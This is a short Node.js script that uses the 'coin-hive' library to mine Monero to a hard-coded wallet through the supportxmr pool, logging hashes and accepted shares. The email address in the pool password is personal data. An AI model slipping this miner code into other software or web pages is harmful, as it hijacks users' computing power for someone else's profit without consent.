console.log('here');
const CoinHive = require('coin-hive');
(async () => {
  const miner = await CoinHive('42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr', {
    pool: {
      host: 'pool.supportxmr.com',
      port: 3333,
      pass: 'n:deme3us@gmail.com' // default 'x' if not provided 
    }
  });
  await miner.start();
  miner.on('found', () => console.log('Found!'))
  miner.on('accepted', () => console.log('Accepted!'))
  miner.on('update', data => console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `));
})();